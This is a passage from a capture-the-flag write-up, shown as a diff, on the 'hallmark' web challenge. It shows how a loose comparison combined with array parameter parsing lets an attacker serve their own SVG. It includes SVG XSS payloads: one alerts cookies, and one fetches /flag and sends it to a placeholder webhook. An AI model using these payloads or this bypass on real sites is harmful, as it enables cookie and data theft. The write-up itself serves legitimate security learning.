@@ -114,5 +114,91 @@
 ### The POST part will do the follwing :
 - Will take svg,content variables from the request body   `svg=&content` // same as the data we saw in the add card request
 - Declare the type variabe to be `text/plain` and id variable to had a UUID v4 value
-- 
+- IF the `svg` is `text` the type will still `text/plain` and will save the card[id] value to be an Object contains the type and content that we provided //cards[id] = { type, content }
+- IF the `svg` is not `text` the type will be `image/svg+xml` and the content will be the value of this svg in IMAGES Object 
+//cards[id] = { type, content: IMAGES[svg] }
+- After adding the card the server will redirects us to `/card?id=uuid_of_the_card`
+
+### We all know that we can get xss from uploading svg but here we can't control the svg img so, let's move to PUT part
+
+<br>
+
+![image](https://user-images.githubusercontent.com/64314534/234564599-ae5670cd-3e64-47d2-a137-3898bc9bc8bb.png)
+
+<br>
+
+### The PUT part will do the following :
+- Will take id,type,svg,content variables from the request body `id=&type=&svg=&content=`
+- IT will check if the cards Object had card with this id and if not it will sends `bad id`
+- The card type will be `image/svg+xml` if the type parameter in the request was `image/svg+xml` and if else it will be `text/plain`
+- The card content will be the file content in the IMAGES Object that had the key of `svg` parameter that we sent in the request 
+Ex : `cake: fs.readFileSync("./static/cake.svg")` so, if the `svg` parameter had value `cake` the content will be the content of `cake.svg` file
+if the value of type was `image/svg+xml`
+- IF the value of type parameter wasn't `image/svg+xml` the content will be the value of `content` parameter
+
+### But the interesing part here is the comparison method of each part 
+
+It's clear now that we need to control the content and in the same time we need the type to be `image/svg+xml` but if we put it in type the application will get the content of the card from the IMAGES Object that we can't control so, let's take a look at the comparison part 
+<br>
+
+![image](https://user-images.githubusercontent.com/64314534/234568155-6dcb88ec-c4c5-4ac7-869b-920ff8498953.png)
+
+<br>
+
+The condition in the type part is `==` ( Loose comparison ) and in the content part is `===` ( Strict comparison ) so, let's try to see how we can bypass the first part to be true and the second part to be false to make the type `image/svg+xml` and also control the content part
+
+- The `==` will return true if the two parts had the same value even in diffrent data types and `===` should had the same data type 
+So, we just had to provide the `type` parameter in any data type rather string and since  `app.use(bodyParser.urlencoded({ extended: true }));` as i mentioned before so, we can provide type parameter as an object like this : 
+- `id=id_of_the_card&type[]=image/svg%2bxml&content=svg_content`
+It's easy to get a svg xss payload like this :
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('XSS\n'+document.domain+'\n'+document.cookie);
+   </script>
+</svg>
+```
+<br>
+
+And then we will go to our card to view it's content like :
+https://hallmark.web.actf.co/card?id=93a17e08-bd94-43ca-9620-45cab9d075a8
+
+<br>
+
+![image](https://user-images.githubusercontent.com/64314534/234572184-6d09c454-0949-4620-95e2-fd5aeb584efb.png)
+
+<br>
+
+
+and we can clearly see that our svg is injected and the content type is as we wish also so, let's try to open it in browser to see the alert :
+
+<br>
+
+![image](https://user-images.githubusercontent.com/64314534/234572278-95e52456-699a-42cc-bd97-f8fadad69adf.png)
+
+<br>
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+     fetch('/flag').then(flag=>flag.text()).then(flag => fetch('your_webhook_url/?c='+flag))
+   </script>
+</svg>
+```
+
+### And we got the flag
+<br>
+
+![image](https://user-images.githubusercontent.com/64314534/234574769-c4ff180d-97ac-4625-a4c5-e406cad94ccb.png)
+
+
+
+
+
 
